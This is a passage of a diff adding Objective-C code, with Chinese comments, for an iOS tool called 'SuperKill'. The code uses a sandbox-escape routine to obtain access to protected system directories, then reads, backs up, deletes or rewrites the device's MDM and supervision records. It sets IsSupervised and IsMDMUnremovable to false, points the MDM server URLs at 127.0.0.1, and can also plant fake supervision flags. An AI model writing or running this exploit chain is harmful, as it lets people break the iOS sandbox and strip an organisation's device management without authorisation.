+
+              xpc_object_t value = copy("com.apple.security.application-groups");
+              if (!value || xpc_get_type(value) != XPC_TYPE_ARRAY) return nil;
+
+              NSFileManager *fm = [NSFileManager defaultManager];
+              size_t count = xpc_array_get_count(value);
+              for (size_t i = 0; i < count; i++) {
+                  const char *raw = xpc_array_get_string(value, i);
+                  if (!raw) continue;
+                  NSString *group = [NSString stringWithUTF8String:raw];
+                  // 只有真的拿到容器，才说明这个 group 在签名/描述文件里被认可
+                  if (group.length && [fm containerURLForSecurityApplicationGroupIdentifier:group]) {
+                      return group;
+                  }
+              }
+              return nil;
+          }
+
+          + (NSString *)configuredAppGroup {
+              NSString *detected = [self appGroupFromEntitlements];
+              if (detected.length) return detected;
+
+              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+              NSString *manual = [defaults stringForKey:SKGroupDefaultsKey];
+              if ([defaults boolForKey:SKGroupUserSetKey] && manual.length) return manual;
+
+              NSString *fallback = [[NSBundle mainBundle] objectForInfoDictionaryKey:SKGroupInfoKey];
+              return fallback.length ? fallback : @"";
+          }
+
+          + (void)setConfiguredAppGroup:(NSString *)group {
+              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+              [defaults setObject:(group ?: @"") forKey:SKGroupDefaultsKey];
+              [defaults setBool:YES forKey:SKGroupUserSetKey];
+              [defaults synchronize];
+          }
+
+          - (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2) {
+              va_list args;
+              va_start(args, format);
+              NSString *line = [[NSString alloc] initWithFormat:format arguments:args];
+              va_end(args);
+              SKLogBlock logger = self.logger;
+              if (logger) logger(line);
+          }
+
+          #pragma mark - 扩展管理
+
+          - (BOOL)hasAccessTo:(NSString *)path {
+              for (NSString *granted in self.handles) {
+                  if ([path isEqualToString:granted]) return YES;
+                  if ([path hasPrefix:[granted stringByAppendingString:@"/"]]) return YES;
+              }
+              return NO;
+          }
+
+          - (BOOL)grantAccessTo:(NSString *)root {
+              if ([self hasAccessTo:root]) return YES;
+              if (self.appGroup.length == 0) {
+                  [self log:@"✗ 没有配置 App Group，签名时必须注入 com.apple.security.application-groups"];
+                  return NO;
+              }
+              if (!sk_has_app_group(self.appGroup)) {
+                  [self log:@"✗ App Group 不可用：%@", self.appGroup];
+                  [self log:@"  说明：entitlements 里的 group 必须在你自己的开发者账号下注册过，并且随描述文件一起签名"];
+                  return NO;
+              }
+              int64_t flags = 0;
+              int64_t handle = sk_escape(root, self.appGroup, false, &flags);
+              if (handle <= 0) {
+                  [self log:@"✗ %@ 取得扩展失败（code %lld）%@",
+                        root.lastPathComponent, (long long)handle, [self hintForCode:handle]];
+                  return NO;
+              }
+              self.handles[root] = @(handle);
+              [self log:@"✓ %@ 已拿到扩展 handle=%lld flags=0x%llx",
+                    root.lastPathComponent, (long long)handle, (unsigned long long)flags];
+              return YES;
+          }
+
+          - (NSString *)hintForCode:(int64_t)code {
+              switch (code) {
+                  case -1:  return @"App Group 无效";
+                  case -2:  return @"系统版本不支持（dylib 或符号缺失）";
+                  case -3:  return @"container_query 创建失败";
+                  case -4:  return @"符号链接创建失败";
+                  case -5:  return @"containermanagerd 拒绝 query（flags/part 不匹配）";
+                  case -6:  return @"内核拒绝签发扩展";
+                  case -255: return @"目标路径不存在";
+                  default: return @"";
+              }
+          }
+
+          - (void)releaseAllExtensions {
+              for (NSString *path in self.handles.allKeys) {
+                  sk_escape_release(self.handles[path].longLongValue);
+                  [self log:@"↺ 释放扩展 %@", path.lastPathComponent];
+              }
+              [self.handles removeAllObjects];
+          }
+
+          #pragma mark - 自检 / 检测
+
+          - (NSString *)environmentReport {
+              NSMutableString *out = [NSMutableString string];
+              NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
+              [out appendFormat:@"iOS: %ld.%ld.%ld\n", (long)v.majorVersion, (long)v.minorVersion, (long)v.patchVersion];
+              [out appendFormat:@"App Group: %@\n", self.appGroup.length ? self.appGroup : @"(空)"];
+              NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:self.appGroup];
+              [out appendFormat:@"Group 容器: %@\n", sk_has_app_group(self.appGroup) ? @"可访问" : @"不可访问"];
+              if (groupURL) [out appendFormat:@"容器路径: %@\n", groupURL.path];
+
+              // 主动探一次真实目标：能拿到扩展就说明整条逃逸链在你这个版本上成立
+              BOOL cfg = [self grantAccessTo:SKConfigurationProfilesRoot];
+              BOOL dev = [self grantAccessTo:SKDeviceManagementRoot];
+              [out appendFormat:@"ConfigurationProfiles: %@\n", cfg ? @"扩展已取得（逃逸可用）" : @"扩展失败"];
+              [out appendFormat:@"DeviceManagement: %@\n", dev ? @"扩展已取得" : @"不可用（未登记 MDM 时属正常）"];
+              [out appendFormat:@"已持有句柄: %lu\n", (unsigned long)self.handles.count];
+              return out;
+          }
+
+          - (NSArray<NSString *> *)entriesIn:(NSString *)root {
+              NSError *error = nil;
+              NSArray<NSString *> *list = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:root error:&error];
+              if (!list) {
+                  [self log:@"  读取目录失败 %@: %@", root.lastPathComponent, error.localizedDescription];
+                  return @[];
+              }
+              return list;
+          }
+
+          - (NSString *)inspectSupervision {
+              NSMutableString *out = [NSMutableString string];
+
+              if ([self grantAccessTo:SKConfigurationProfilesRoot]) {
+                  [out appendFormat:@"== %@ ==\n", SKConfigurationProfilesRoot.lastPathComponent];
+                  for (NSString *name in [self entriesIn:SKConfigurationProfilesRoot]) {
+                      [out appendFormat:@"  • %@\n", name];
+                  }
+
+                  NSString *ccdPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"];
+                  NSDictionary *ccd = SKReadPlist(ccdPath);
+                  if ([ccd isKindOfClass:[NSDictionary class]]) {
+                      id supervised = ccd[@"IsSupervised"];
+                      self.supervisedState = [supervised respondsToSelector:@selector(integerValue)] ? [supervised integerValue] : -1;
+                      [out appendFormat:@"\n监管: IsSupervised = %@\n", supervised ?: @"(缺省)"];
+                      [out appendFormat:@"组织: %@\n", ccd[@"OrganizationName"] ?: @"(无)"];
+                      [out appendFormat:@"IsMandatory = %@ / IsMDMUnremovable = %@\n",
+                          ccd[@"IsMandatory"] ?: @"(无)", ccd[@"IsMDMUnremovable"] ?: @"(无)"];
+                      [out appendFormat:@"ConfigurationURL: %@\n", ccd[@"ConfigurationURL"] ?: @"(无)"];
+                  } else {
+                      [out appendString:@"\n监管: 未找到 CloudConfigurationDetails.plist（可能已清除）\n"];
+                      self.supervisedState = 0;
+                  }
+
+                  NSDictionary *mdm = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"]);
+                  if ([mdm isKindOfClass:[NSDictionary class]]) {
+                      [out appendFormat:@"\nMDM ServerURL: %@\n", mdm[@"ServerURL"] ?: @"(无)"];
+                      [out appendFormat:@"MDM CheckInURL: %@\n", mdm[@"CheckInURL"] ?: @"(无)"];
+                      [out appendFormat:@"MDM Topic: %@\n", mdm[@"Topic"] ?: @"(无)"];
+                  }
+              }
+
+              if ([self grantAccessTo:SKDeviceManagementRoot]) {
+                  [out appendFormat:@"\n== %@ ==\n", SKDeviceManagementRoot.lastPathComponent];
+                  for (NSString *name in [self entriesIn:SKDeviceManagementRoot]) {
+                      [out appendFormat:@"  • %@\n", name];
+                  }
+              }
+
+              if ([self grantAccessTo:SKUserProfilesRoot]) {
+                  [out appendFormat:@"\n== %@ ==\n", SKUserProfilesRoot.lastPathComponent];
+                  for (NSString *name in [self entriesIn:SKUserProfilesRoot]) {
+                      [out appendFormat:@"  • %@\n", name];
+                  }
+              }
+
+              [self log:@"%@", out];
+              return out;
+          }
+
+          #pragma mark - 备份
+
+          - (NSString *)backupsRoot {
+              NSString *documents = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+              return [documents stringByAppendingPathComponent:@"backups"];
+          }
+
+          - (NSString *)backup:(NSError **)error {
+              NSFileManager *fm = [NSFileManager defaultManager];
+              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+              formatter.dateFormat = @"yyyyMMdd-HHmmss";
+              NSString *stamp = [formatter stringFromDate:[NSDate date]];
+
+              NSString *root = [self backupsRoot];
+              [fm createDirectoryAtPath:root withIntermediateDirectories:YES attributes:nil error:NULL];
+              NSString *dest = [root stringByAppendingPathComponent:stamp];
+              NSError *createError = nil;
+              if (![fm createDirectoryAtPath:dest withIntermediateDirectories:YES attributes:nil error:&createError]) {
+                  if (error) *error = createError;
+                  return nil;
+              }
+
+              NSArray<NSString *> *roots = @[SKConfigurationProfilesRoot, SKDeviceManagementRoot, SKUserProfilesRoot];
+              NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
+              NSInteger total = 0;
+
+              for (NSUInteger i = 0; i < roots.count; i++) {
+                  NSString *source = roots[i];
+                  if (![self grantAccessTo:source]) continue;
+
+                  NSString *slug = [NSString stringWithFormat:@"%lu-%@", (unsigned long)i, source.lastPathComponent];
+                  NSString *dst = [dest stringByAppendingPathComponent:slug];
+                  [fm createDirectoryAtPath:dst withIntermediateDirectories:YES attributes:nil error:NULL];
+
+                  NSInteger copied = 0;
+                  for (NSString *name in [self entriesIn:source]) {
+                      NSString *from = [source stringByAppendingPathComponent:name];
+                      NSString *to = [dst stringByAppendingPathComponent:name];
+                      if ([fm copyItemAtPath:from toPath:to error:NULL]) copied++;
+                  }
+                  map[slug] = source;
+                  total += copied;
+                  [self log:@"备份 %@ → %ld 项", source.lastPathComponent, (long)copied];
+              }
+
+              SKWritePlist(map, [dest stringByAppendingPathComponent:@"roots.plist"]);
+              [self log:@"✓ 备份完成（%ld 项）: %@", (long)total, dest];
+              return dest;
+          }
+
+          #pragma mark - 清除
+
+          - (BOOL)removeItem:(NSString *)path {
+              NSError *error = nil;
+              if ([[NSFileManager defaultManager] fileExistsAtPath:path] == NO) return NO;
+              BOOL ok = [[NSFileManager defaultManager] removeItemAtPath:path error:&error];
+              [self log:@"%@ %@", ok ? @"− 删除" : @"✗ 删除失败", path.lastPathComponent];
+              if (!ok && error) [self log:@"    %@", error.localizedDescription];
+              return ok;
+          }
+
+          - (void)emptyPayloadManifestIn:(NSString *)root {
+              NSString *path = [root stringByAppendingPathComponent:@"PayloadManifest.plist"];
+              id manifest = SKReadPlist(path);
+              if (![manifest isKindOfClass:[NSDictionary class]]) return;
+              NSMutableDictionary *dict = [manifest mutableCopy];
+              dict[@"OrderedProfiles"] = @[];
+              if (SKWritePlist(dict, path)) {
+                  [self log:@"✓ PayloadManifest.OrderedProfiles 已清空"];
+              }
+          }
+
+          - (BOOL)wipeSupervision:(BOOL)aggressive error:(NSError **)error {
+              BOOL touched = NO;
+
+              // 1. 监管 + MDM 主状态目录（systemgroup.com.apple.configurationprofiles）
+              if ([self grantAccessTo:SKConfigurationProfilesRoot]) {
+                  NSArray<NSString *> *core = @[
+                      @"CloudConfigurationDetails.plist",
+                      @"CloudConfigurationSetAsideDetails.plist",
+                      @"MDM.plist",
+                      @"MDMEvents.plist",
+                      @"MDMAppManagement.plist",
+                      @"ProfileTruth.plist",
+                      @"Truth.plist",
+                      @"ClientTruth.plist",
+                  ];
+                  for (NSString *name in core) {
+                      [self removeItem:[SKConfigurationProfilesRoot stringByAppendingPathComponent:name]];
+                  }
+                  [self emptyPayloadManifestIn:SKConfigurationProfilesRoot];
+
+                  if (aggressive) {
+                      // 所有 GUID.stub 一并清掉，让 profiled 认为一个 profile 都没装过
+                      for (NSString *name in [self entriesIn:SKConfigurationProfilesRoot]) {
+                          if ([name.pathExtension isEqualToString:@"stub"]) {
+                              [self removeItem:[SKConfigurationProfilesRoot stringByAppendingPathComponent:name]];
+                          }
+                      }
+                  }
+                  touched = YES;
+              }
+
+              // 2. 设备管理层状态（ClientTruth / MDM 副本）
+              if ([self grantAccessTo:SKDeviceManagementRoot]) {
+                  NSArray<NSString *> *mgmt = @[
+                      @"ClientTruth.plist",
+                      @"CloudConfigurationDetails.plist",
+                      @"MDM.plist",
+                      @"MDMEvents.plist",
+                      @"MDMAppManagement.plist",
+                      @"ManagementState.plist",
+                  ];
+                  for (NSString *name in mgmt) {
+                      [self removeItem:[SKDeviceManagementRoot stringByAppendingPathComponent:name]];
+                  }
+                  touched = YES;
+              }
+
+              // 3. 用户级 profile 目录
+              if (aggressive && [self grantAccessTo:SKUserProfilesRoot]) {
+                  for (NSString *name in [self entriesIn:SKUserProfilesRoot]) {
+                      [self removeItem:[SKUserProfilesRoot stringByAppendingPathComponent:name]];
+                  }
+              }
+
+              if (!touched) {
+                  if (error) {
+                      *error = [NSError errorWithDomain:@"SuperKill"
+                                                   code:1
+                                               userInfo:@{NSLocalizedDescriptionKey: @"一个目标目录都没拿到访问权限"}];
+                  }
+                  return NO;
+              }
+
+              [self log:@"✓ 监管状态已清除：请保持断网并重启设备"];
+              return YES;
+          }
+
+          #pragma mark - 温和补丁
+
+          - (BOOL)patchSupervision:(NSError **)error {
+              if (![self grantAccessTo:SKConfigurationProfilesRoot]) {
+                  if (error) {
+                      *error = [NSError errorWithDomain:@"SuperKill"
+                                                   code:2
+                                               userInfo:@{NSLocalizedDescriptionKey: @"拿不到 ConfigurationProfiles 扩展"}];
+                  }
+                  return NO;
+              }
+
+              BOOL changed = NO;
+
+              NSString *ccdPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"];
+              id ccdRaw = SKReadPlist(ccdPath);
+              NSMutableDictionary *ccd = [ccdRaw isKindOfClass:[NSDictionary class]] ? [ccdRaw mutableCopy] : nil;
+              if (ccd) {
+                  ccd[@"IsSupervised"] = @NO;
+                  ccd[@"IsMandatory"] = @NO;
+                  ccd[@"IsMDMUnremovable"] = @0;
+                  ccd[@"ConfigurationURL"] = @"https://127.0.0.1:1/";
+                  if (SKWritePlist(ccd, ccdPath)) {
+                      changed = YES;
+                      [self log:@"✓ CloudConfigurationDetails：IsSupervised / IsMandatory 已降为 false"];
+                  }
+              }
+
+              NSString *mdmPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"];
+              id mdmRaw = SKReadPlist(mdmPath);
+              NSMutableDictionary *mdm = [mdmRaw isKindOfClass:[NSDictionary class]] ? [mdmRaw mutableCopy] : nil;
+              if (mdm) {
+                  mdm[@"ServerURL"] = @"https://127.0.0.1:1/";
+                  mdm[@"CheckInURL"] = @"https://127.0.0.1:1/";
+                  mdm[@"SignMessage"] = @NO;
+                  if (SKWritePlist(mdm, mdmPath)) {
+                      changed = YES;
+                      [self log:@"✓ MDM.plist：Server/CheckIn 已指向黑洞地址"];
+                  }
+              }
+
+              NSString *appMgmtPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDMAppManagement.plist"];
+              id appRaw = SKReadPlist(appMgmtPath);
+              NSMutableDictionary *appMgmt = [appRaw isKindOfClass:[NSDictionary class]] ? [appRaw mutableCopy] : nil;
+              if (appMgmt) {
+                  appMgmt[@"metadataByBundleID"] = @{};
+                  if (SKWritePlist(appMgmt, appMgmtPath)) {
+                      changed = YES;
+                      [self log:@"✓ MDMAppManagement：托管 App 清单已清空"];
+                  }
+              }
+
+              [self emptyPayloadManifestIn:SKConfigurationProfilesRoot];
+
+              if (!changed) {
+                  [self log:@"✗ 没有可改写的 plist（可能已经是干净的）"];
+              }
+              return changed;
+          }
+
+          #pragma mark - 开启监管（测试）
+
+          - (BOOL)enableSupervisionWithOrganization:(NSString *)organization
+                                             email:(NSString *)email
+                                  configurationURL:(NSString *)url
+                                           withMDM:(BOOL)withMDM
+                                             error:(NSError **)error {
+              if (![self grantAccessTo:SKConfigurationProfilesRoot]) {
+                  if (error) {
+                      *error = [NSError errorWithDomain:@"SuperKill"
+                                                   code:5
+                                               userInfo:@{NSLocalizedDescriptionKey: @"拿不到 ConfigurationProfiles 扩展"}];
+                  }
+                  return NO;
+              }
+
+              NSString *ccdPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"];
+              id existing = SKReadPlist(ccdPath);
+              NSMutableDictionary *ccd = [existing isKindOfClass:[NSDictionary class]]
+                  ? [existing mutableCopy]
+                  : [NSMutableDictionary dictionary];
+
+              // 与真实监管设备写入的键值保持一致，profiled / DeviceManagement 认这几个字段
+              ccd[@"IsSupervised"] = @YES;
+              ccd[@"IsMandatory"] = @YES;
+              ccd[@"IsMDMUnremovable"] = @1;
+              ccd[@"IsMultiUser"] = @NO;
+              ccd[@"ConfigurationWasApplied"] = @YES;
+              ccd[@"OrganizationName"] = organization.length ? organization : @"Test Organization";
+              ccd[@"ConfigurationURL"] = url.length ? url : @"https://mdm.invalid/profile";
+              ccd[@"LastModifiedTime"] = [NSDate date];
+              if (email.length) ccd[@"OrganizationEmail"] = email;
+
+              if (!SKWritePlist(ccd, ccdPath)) {
+                  if (error) {
+                      *error = [NSError errorWithDomain:@"SuperKill"
+                                                   code:6
+                                               userInfo:@{NSLocalizedDescriptionKey: @"CloudConfigurationDetails.plist 写入失败"}];
+                  }
+                  [self log:@"✗ 写入 CloudConfigurationDetails.plist 失败"];
+                  return NO;
+              }
+              [self log:@"✓ 已写入监管标记：IsSupervised = true，组织 = %@", ccd[@"OrganizationName"]];
+
+              if (withMDM) {
+                  NSString *mdmPath = [SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"];
+                  id mdmRaw = SKReadPlist(mdmPath);
+                  NSMutableDictionary *mdm = [mdmRaw isKindOfClass:[NSDictionary class]]
+                      ? [mdmRaw mutableCopy]
+                      : [NSMutableDictionary dictionary];
+                  mdm[@"ServerURL"] = @"https://mdm.invalid/mdm";
+                  mdm[@"CheckInURL"] = @"https://mdm.invalid/checkin";
+                  mdm[@"Topic"] = @"com.apple.mgmt.External.test";
+                  mdm[@"SignMessage"] = @NO;
+                  if (SKWritePlist(mdm, mdmPath)) {
+                      [self log:@"✓ 已写入 MDM.plist 占位（无 APNs 证书，不会真的注册）"];
+                  } else {
+                      [self log:@"✗ MDM.plist 写入失败"];
+                  }
+              }
+
+              // 读回校验，确认落盘成功
+              NSDictionary *verify = SKReadPlist(ccdPath);
+              BOOL supervised = [verify[@"IsSupervised"] boolValue];
+              [self log:supervised ? @"✓ 读回校验通过：IsSupervised = true（重启后生效）"
+                                   : @"✗ 读回校验失败：IsSupervised 不是 true"];
+
+              // DeviceManagement 侧再镜像一份：部分版本优先读这里
+              [self mirrorCloudConfiguration:ccd];
+              return supervised;
+          }
+
+          - (void)mirrorCloudConfiguration:(NSDictionary *)cloud {
+              if (![self grantAccessTo:SKDeviceManagementRoot]) return;
+
+              NSString *mirrorPath = [SKDeviceManagementRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"];
+              if (SKWritePlist(cloud, mirrorPath)) {
+                  [self log:@"✓ DeviceManagement/CloudConfigurationDetails.plist 已镜像"];
+              }
+
+              NSString *truthPath = [SKDeviceManagementRoot stringByAppendingPathComponent:@"ClientTruth.plist"];
+              id truthRaw = SKReadPlist(truthPath);
+              if (![truthRaw isKindOfClass:[NSDictionary class]]) return;
+              NSMutableDictionary *truth = [truthRaw mutableCopy];
+
+              id entryRaw = truth[@"CloudConfiguration"];
+              NSMutableDictionary *entry = [entryRaw isKindOfClass:[NSDictionary class]]
+                  ? [entryRaw mutableCopy]
+                  : [NSMutableDictionary dictionary];
+              entry[@"IsSupervised"] = @YES;
+              entry[@"IsMandatory"] = @YES;
+              entry[@"OrganizationName"] = cloud[@"OrganizationName"] ?: @"Test Organization";
+              truth[@"CloudConfiguration"] = entry;
+              if (SKWritePlist(truth, truthPath)) {
+                  [self log:@"✓ ClientTruth.CloudConfiguration 已同步为受监管"];
+              }
+          }
+
+          #pragma mark - 快照与对比
+
+          static NSArray<NSString *> *SKCloudKeys(void) {
+              return @[@"IsSupervised", @"IsMandatory", @"IsMDMUnremovable", @"IsMultiUser",
+                       @"ConfigurationWasApplied", @"OrganizationName", @"OrganizationEmail",
+                       @"ConfigurationURL"];
+          }
+
+          static NSArray<NSString *> *SKMDMKeys(void) {
+              return @[@"ServerURL", @"CheckInURL", @"Topic", @"SignMessage"];
+          }
+
+          static NSArray<NSString *> *SKTruthKeys(void) {
+              return @[@"IsSupervised", @"IsMandatory", @"OrganizationName"];
+          }
+
+          - (NSString *)snapshotsRoot {
+              NSString *documents = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+              return [documents stringByAppendingPathComponent:@"snapshots"];
+          }
+
+          - (NSDictionary *)subsetOf:(NSDictionary *)dict keys:(NSArray<NSString *> *)keys {
+              NSMutableDictionary *out = [NSMutableDictionary dictionary];
+              if (![dict isKindOfClass:[NSDictionary class]]) return out;
+              for (NSString *key in keys) {
+                  id value = dict[key];
+                  if (value) out[key] = value;
+              }
+              return out;
+          }
+
+          - (NSDictionary *)describeEntriesIn:(NSString *)root {
+              NSFileManager *fm = [NSFileManager defaultManager];
+              NSMutableDictionary *out = [NSMutableDictionary dictionary];
+              for (NSString *name in [self entriesIn:root]) {
+                  NSString *path = [root stringByAppendingPathComponent:name];
+                  NSDictionary *attributes = [fm attributesOfItemAtPath:path error:NULL];
+                  NSMutableDictionary *meta = [NSMutableDictionary dictionary];
+                  meta[@"size"] = @([attributes[NSFileSize] unsignedLongLongValue]);
+                  meta[@"mtime"] = @((long long)[attributes[NSFileModificationDate] timeIntervalSince1970]);
+                  meta[@"dir"] = @([attributes[NSFileType] isEqualToString:NSFileTypeDirectory]);
+                  out[name] = meta;
+              }
+              return out;
+          }
+
+          - (NSDictionary *)captureState {
+              NSMutableDictionary *state = [NSMutableDictionary dictionary];
+              state[@"created"] = [NSDate date];
+
+              NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
+              state[@"os"] = [NSString stringWithFormat:@"%ld.%ld.%ld",
+                              (long)v.majorVersion, (long)v.minorVersion, (long)v.patchVersion];
+
+              NSMutableDictionary *roots = [NSMutableDictionary dictionary];
+
+              // 1) ConfigurationProfiles
+              NSMutableDictionary *cfg = [NSMutableDictionary dictionary];
+              BOOL cfgAvailable = [self grantAccessTo:SKConfigurationProfilesRoot];
+              cfg[@"available"] = @(cfgAvailable);
+              if (cfgAvailable) {
+                  cfg[@"entries"] = [self describeEntriesIn:SKConfigurationProfilesRoot];
+
+                  id cloud = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"]);
+                  if ([cloud isKindOfClass:[NSDictionary class]]) {
+                      cfg[@"cloud"] = [self subsetOf:cloud keys:SKCloudKeys()];
+                  }
+                  id mdm = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"]);
+                  if ([mdm isKindOfClass:[NSDictionary class]]) {
+                      cfg[@"mdm"] = [self subsetOf:mdm keys:SKMDMKeys()];
+                  }
+                  id manifest = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"PayloadManifest.plist"]);
+                  if ([manifest isKindOfClass:[NSDictionary class]]) {
+                      id ordered = manifest[@"OrderedProfiles"];
+                      if ([ordered isKindOfClass:[NSArray class]]) cfg[@"orderedProfiles"] = @([ordered count]);
+                  }
+              }
+              roots[SKConfigurationProfilesRoot] = cfg;
+
+              // 2) DeviceManagement
+              NSMutableDictionary *dev = [NSMutableDictionary dictionary];
+              BOOL devAvailable = [self grantAccessTo:SKDeviceManagementRoot];
+              dev[@"available"] = @(devAvailable);
+              if (devAvailable) {
+                  dev[@"entries"] = [self describeEntriesIn:SKDeviceManagementRoot];
+
+                  id cloud = SKReadPlist([SKDeviceManagementRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"]);
+                  if ([cloud isKindOfClass:[NSDictionary class]]) {
+                      dev[@"cloud"] = [self subsetOf:cloud keys:SKCloudKeys()];
+                  }
+                  id truth = SKReadPlist([SKDeviceManagementRoot stringByAppendingPathComponent:@"ClientTruth.plist"]);
+                  if ([truth isKindOfClass:[NSDictionary class]]) {
+                      id entry = truth[@"CloudConfiguration"];
+                      if ([entry isKindOfClass:[NSDictionary class]]) {
+                          dev[@"clientTruth"] = [self subsetOf:entry keys:SKTruthKeys()];
+                      }
+                  }
+              }
+              roots[SKDeviceManagementRoot] = dev;
+
+              // 3) 用户级 profile 目录
+              NSMutableDictionary *usr = [NSMutableDictionary dictionary];
+              BOOL usrAvailable = [self grantAccessTo:SKUserProfilesRoot];
+              usr[@"available"] = @(usrAvailable);
+              if (usrAvailable) {
+                  usr[@"entries"] = [self describeEntriesIn:SKUserProfilesRoot];
+              }
+              roots[SKUserProfilesRoot] = usr;
+
+              state[@"roots"] = roots;
+              return state;
+          }
+
+          - (NSString *)summarizeState:(NSDictionary *)state {
+              NSDictionary *roots = state[@"roots"];
+              NSDictionary *cfg = roots[SKConfigurationProfilesRoot] ?: @{};
+              NSDictionary *cloud = cfg[@"cloud"] ?: @{};
+              NSDictionary *mdm = cfg[@"mdm"] ?: @{};
+
+              return [NSString stringWithFormat:@"iOS %@ · ConfigurationProfiles %lu 项 · IsSupervised=%@ · 组织=%@ · MDM=%@",
+                      state[@"os"] ?: @"?",
+                      (unsigned long)[cfg[@"entries"] count],
+                      cloud[@"IsSupervised"] ?: @"(无)",
+                      cloud[@"OrganizationName"] ?: @"(无)",
+                      mdm[@"ServerURL"] ?: @"(无)"];
+          }
+
+          - (NSString *)captureSnapshotWithLabel:(NSString *)label {
+              NSMutableDictionary *state = [[self captureState] mutableCopy];
+              NSString *text = label.length ? label : @"snapshot";
+              state[@"label"] = text;
+
+              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+              formatter.dateFormat = @"yyyyMMdd-HHmmss";
+              NSString *stamp = [formatter stringFromDate:[NSDate date]];
+
+              NSCharacterSet *unsafe = [NSCharacterSet characterSetWithCharactersInString:@"/\\: "];
+              NSString *safe = [[text componentsSeparatedByCharactersInSet:unsafe] componentsJoinedByString:@"_"];
+              NSString *name = [NSString stringWithFormat:@"%@-%@.plist", stamp, safe];
+
+              NSString *dir = [self snapshotsRoot];
+              [[NSFileManager defaultManager] createDirectoryAtPath:dir
+                                        withIntermediateDirectories:YES
+                                                         attributes:nil
+                                                              error:NULL];
+              BOOL ok = SKWritePlist(state, [dir stringByAppendingPathComponent:name]);
+
+              NSString *summary = [self summarizeState:state];
+              [self log:@"📸 %@ %@：%@", ok ? @"快照已保存" : @"快照写入失败", name, summary];
+              return summary;
+          }
+
+          - (NSString *)snapshotTitle:(NSDictionary *)snapshot {
+              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+              formatter.dateFormat = @"MM-dd HH:mm:ss";
+              NSDate *date = snapshot[@"created"];
+              NSString *when = [date isKindOfClass:[NSDate class]] ? [formatter stringFromDate:date] : @"?";
+              return [NSString stringWithFormat:@"%@ @ %@", snapshot[@"label"] ?: @"snapshot", when];
+          }
+
+          - (NSString *)valueText:(id)value {
+              if (!value) return @"(无)";
+              NSString *text = [value description];
+              if (text.length > 60) {
+                  text = [[text substringToIndex:60] stringByAppendingString:@"…"];
+              }
+              return text;
+          }
+
+          - (void)appendEntriesDiffFrom:(NSDictionary *)left
+                                     to:(NSDictionary *)right
+                                   into:(NSMutableString *)out {
+              NSDictionary *l = left ?: @{};
+              NSDictionary *r = right ?: @{};
+
+              NSMutableSet *names = [NSMutableSet setWithArray:l.allKeys];
+              [names addObjectsFromArray:r.allKeys];
+              NSArray *sorted = [names.allObjects sortedArrayUsingSelector:@selector(compare:)];
+
+              NSMutableArray<NSString *> *lines = [NSMutableArray array];
+              for (NSString *name in sorted) {
+                  NSDictionary *lm = l[name];
+                  NSDictionary *rm = r[name];
+                  if (!lm && rm) {
+                      [lines addObject:[NSString stringWithFormat:@"  + %@ (%@ B)", name, rm[@"size"] ?: @"?"]];
+                  } else if (lm && !rm) {
+                      [lines addObject:[NSString stringWithFormat:@"  − %@ (%@ B)", name, lm[@"size"] ?: @"?"]];
+                  } else if (![lm[@"size"] isEqual:rm[@"size"]]) {
+                      [lines addObject:[NSString stringWithFormat:@"  ~ %@ 大小 %@ → %@ B",
+                                        name, lm[@"size"] ?: @"?", rm[@"size"] ?: @"?"]];
+                  }
+              }
+
+              if (lines.count == 0) {
+                  [out appendString:@"  目录结构无变化\n"];
+              } else {
+                  [out appendFormat:@"%@\n", [lines componentsJoinedByString:@"\n"]];
+              }
+          }
+
+          - (void)appendValuesDiffFrom:(NSDictionary *)left
+                                    to:(NSDictionary *)right
+                               section:(NSString *)section
+                                  into:(NSMutableString *)out {
+              NSDictionary *l = [left isKindOfClass:[NSDictionary class]] ? left : nil;
+              NSDictionary *r = [right isKindOfClass:[NSDictionary class]] ? right : nil;
+              if (!l && !r) return;
+
+              NSMutableSet *keys = [NSMutableSet setWithArray:(l.allKeys ?: @[])];
+              [keys addObjectsFromArray:(r.allKeys ?: @[])];
+
+              NSArray *sorted = [keys.allObjects sortedArrayUsingSelector:@selector(compare:)];
+              for (NSString *key in sorted) {
+                  id lv = l[key];
+                  id rv = r[key];
+                  if ([lv isEqual:rv]) continue;
+                  [out appendFormat:@"  %@.%@: %@ → %@\n", section, key, [self valueText:lv], [self valueText:rv]];
+              }
+          }
+
+          - (NSString *)diffFrom:(NSDictionary *)left to:(NSDictionary *)right {
+              NSMutableString *out = [NSMutableString string];
+              [out appendFormat:@"\n=== %@  →  %@ ===\n", [self snapshotTitle:left], [self snapshotTitle:right]];
+
+              NSDictionary *leftRoots = left[@"roots"] ?: @{};
+              NSDictionary *rightRoots = right[@"roots"] ?: @{};
+
+              id lSup = leftRoots[SKConfigurationProfilesRoot][@"cloud"][@"IsSupervised"];
+              id rSup = rightRoots[SKConfigurationProfilesRoot][@"cloud"][@"IsSupervised"];
